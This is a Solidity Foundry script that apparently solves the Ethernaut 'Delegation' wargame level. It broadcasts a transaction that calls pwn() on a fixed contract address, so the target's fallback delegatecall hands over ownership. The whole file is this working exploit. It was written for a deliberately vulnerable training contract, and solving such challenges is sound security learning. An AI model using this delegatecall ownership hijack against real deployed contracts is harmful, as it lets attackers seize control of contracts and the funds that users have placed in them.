// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Delegation} from "ethernaut/delegation.sol";
import "forge-std/console.sol";

contract DelegationHackScript is Script {
    Delegation delegationIns = Delegation(0x56931F8204C0BB5EdeB366DB0fA5F56b7B6dedd5);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address(delegationIns).call(abi.encodeWithSignature("pwn()"));
        vm.stopBroadcast();
    }

}
